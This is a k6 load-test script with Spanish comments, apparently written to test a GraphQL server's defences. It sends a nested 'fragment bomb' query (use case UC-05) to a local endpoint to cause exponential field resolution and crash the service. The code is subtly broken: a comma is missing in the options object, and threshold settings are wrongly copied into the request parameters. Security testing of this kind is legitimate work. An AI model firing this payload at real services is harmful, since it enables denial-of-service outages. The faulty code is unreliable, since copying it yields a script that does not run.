import http from 'k6/http';
import { check, sleep } from 'k6';
import { Trend, Rate } from 'k6/metrics';

// =============================================================================
// FORMALIZACIÓN METROLOGÍA - NORMA ISO/IEC 25023 & METODOLOGÍA WOHLIN
// =============================================================================
export const LatenciaMedia = new Trend('iso_latencia_media');
export const TasaFallosRed = new Rate('iso_tasa_fallos_red');

export const options = {
  vus: __ENV.VUS ? parseInt(__ENV.VUS) : 10,
  duration: '60s',
  timeout: '30s'
  thresholds: {
    // Circuit Breaker (Metodología SRE Google): aborta si el sistema ya colapsó
    'http_req_failed': [{ threshold: 'rate<0.50', abortOnFail: true, delayAbortEval: '10s' }],
    'http_req_duration': [{ threshold: 'p(95)<30000', abortOnFail: true, delayAbortEval: '10s' }],
  },
};
// ═══════════════════════════════════════════════════════════════
// Payload UC-05: Ataque Bomba de Fragmentos
// Explota la evaluación exponencial de fragmentos anidados.
// Cada nivel multiplica por 5 el número de resoluciones de campos.
// 5 * 5 * 5 * 5 = 625 resoluciones de campos de Usuario por cada
// usuario devuelto por listarUsuarios.
// ═══════════════════════════════════════════════════════════════
const payload = JSON.stringify({
  query: `
    query AtaqueBombaFragmentos {
      listarUsuarios {
        ...F1
        ...F1
        ...F1
        ...F1
        ...F1
      }
    }

    fragment F1 on Usuario {
      ...F2
      ...F2
      ...F2
      ...F2
      ...F2
    }

    fragment F2 on Usuario {
      ...F3
      ...F3
      ...F3
      ...F3
      ...F3
    }

    fragment F3 on Usuario {
      ...F4
      ...F4
      ...F4
      ...F4
      ...F4
    }

    fragment F4 on Usuario {
      id
      nombre
      email
    }
  `
});

export default function () {
  const url = 'http://localhost:4000/graphql';
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-Attack-Vector': 'UC-05-Bomba-Fragmentos',
    },
    timeout: '30s',
    thresholds: {
    // Circuit Breaker (Metodología SRE Google): aborta si el sistema ya colapsó
    'http_req_failed': [{ threshold: 'rate<0.50', abortOnFail: true, delayAbortEval: '10s' }],
    'http_req_duration': [{ threshold: 'p(95)<30000', abortOnFail: true, delayAbortEval: '10s' }],
  },
};
  const res = http.post(url, payload, params);

  check(res, {
    'Respuesta exitosa (200 sin errores)': (r) => r.status === 200 && !r.body.includes('errors'),
    'Bloqueado por control (400/403)': (r) => r.status === 400 || r.status === 403 || (r.status === 200 && r.body.includes('errors')),
    'Servidor caido (500/502/504/timeout)': (r) => r.status >= 500 || r.error,
  });

  LatenciaMedia.add(res.timings.duration);
  const exito = res.status === 200 && !res.body.includes('errors');
  TasaFallosRed.add(!exito);

  sleep(0.1);
}
